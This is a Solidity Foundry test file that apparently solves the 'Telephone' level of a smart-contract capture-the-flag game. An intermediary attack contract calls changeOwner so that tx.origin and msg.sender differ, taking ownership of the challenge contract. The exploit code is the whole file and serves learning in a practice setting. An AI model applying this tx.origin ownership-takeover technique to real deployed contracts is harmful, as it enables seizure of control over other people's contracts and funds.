// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";
import "../utils.sol";

interface ITelephone {
  function changeOwner(address _owner) external;
}

contract TelephoneAttack {
  ITelephone internal challenge;

  constructor(address _challengeAddress) {
    challenge = ITelephone(_challengeAddress);
  }

  function attack() public {
    challenge.changeOwner(msg.sender);
  }
}

contract TelephoneTest is Test {
  address internal challengeAddress;
  TelephoneAttack internal attackContract;

  function setUp() public {
    challengeAddress = utils.createLevelInstance(0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe);
    attackContract = new TelephoneAttack(challengeAddress);
  }

  function testExploit() public {
    attackContract.attack();
    utils.submitLevelInstance(challengeAddress);
  }
}
